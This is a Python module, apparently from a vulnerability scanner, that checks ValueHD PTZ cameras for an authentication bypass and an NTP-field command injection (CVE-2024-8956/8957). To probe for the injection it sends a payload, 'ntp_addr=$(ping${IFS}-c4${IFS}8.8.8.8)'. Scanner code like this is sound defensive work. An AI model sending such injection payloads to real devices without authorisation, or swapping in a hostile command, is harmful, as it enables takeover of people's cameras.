"""Agent Asteroid implementation for CVE-2024-8956 and CVE-2024-8957"""

import datetime
import logging
import re

from packaging import version
from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "ValueHD PTZ Camera Authentication Bypass and Command Injection"
VULNERABILITY_REFERENCE = ["CVE-2024-8956", "CVE-2024-8957"]
VULNERABILITY_DESCRIPTION = (
    "ValueHD PTZ cameras below firmware version 6.3.40 contain an authentication bypass "
    "vulnerability in the param.cgi endpoint and a command injection vulnerability via "
    "NTP server configuration."
)
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=90)


@exploits_registry.register
class VHDPTZExploit(webexploit.WebExploit):
    accept_request = definitions.Request(
        method="GET", path="/cgi-bin/param.cgi?get_device_conf"
    )
    check_request = definitions.Request(
        method="GET", path="/cgi-bin/param.cgi?get_device_conf"
    )
    inject_request = definitions.Request(
        method="POST",
        path="/cgi-bin/param.cgi?post_network_other_conf",
        data=b"ntp_addr=$(ping${IFS}-c4${IFS}8.8.8.8)",
    )

    accept_pattern = [
        re.compile(r'versioninfo="SOC v\d+\.\d+\.\d+\s*[-\\s*ARM]?'),
    ]

    version_pattern = re.compile(r'versioninfo="SOC v(\d+\.\d+\.\d+)')

    vuln_ranges = [
        definitions.VulnRange(
            min=None,  # No minimum version
            max=version.Version("6.3.39"),  # Versions up to 6.3.39 are vulnerable
        )
    ]

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Rule to detect specific vulnerabilities on a target."""

        vulnerabilities: list[definitions.Vulnerability] = []
        vulnerabilities.extend(self._detect_auth_bypass(target))
        vulnerabilities.extend(self._detect_command_injection(target))

        return vulnerabilities

    def _detect_auth_bypass(
        self, target: definitions.Target
    ) -> list[definitions.Vulnerability]:
        """Detect the authentication bypass vulnerability."""
        vulnerabilities: list[definitions.Vulnerability] = []

        target_endpoint = self.accept_request.path
        try:
            resp = self.session.get(
                f"{target.origin}{target_endpoint}", timeout=DEFAULT_TIMEOUT.seconds
            )
            if self._is_vulnerable_version(resp.text) is True:
                vulnerabilities.append(self._create_vulnerability(target))
        except requests_exceptions.RequestException as e:
            logging.error("Auth bypass detection failed: %s", e)

        return vulnerabilities

    def _detect_command_injection(
        self, target: definitions.Target
    ) -> list[definitions.Vulnerability]:
        """Detect the command injection vulnerability."""
        vulnerabilities: list[definitions.Vulnerability] = []

        target_endpoint = self.inject_request.path
        try:
            resp = self.session.post(
                f"{target.origin}{target_endpoint}",
                data=self.inject_request.data,
                timeout=DEFAULT_TIMEOUT.seconds,
            )
            if resp.status_code == 200 and "Success" in resp.text:
                vulnerabilities.append(self._create_vulnerability(target))
        except requests_exceptions.RequestException as e:
            logging.error("Command injection detection failed: %s", e)

        return vulnerabilities

    def _is_vulnerable_version(self, response_text: str) -> bool:
        """Check if the target is running a vulnerable version."""
        if (matched := self.version_pattern.findall(response_text)) is not None:
            for extracted_version in matched:
                logging.info("Extracted version: %s", extracted_version)
                for r in self.vuln_ranges:
                    if (
                        r.min is None or r.min <= version.Version(extracted_version)
                    ) and (
                        r.max is None or r.max >= version.Version(extracted_version)
                    ):
                        return True
        return False
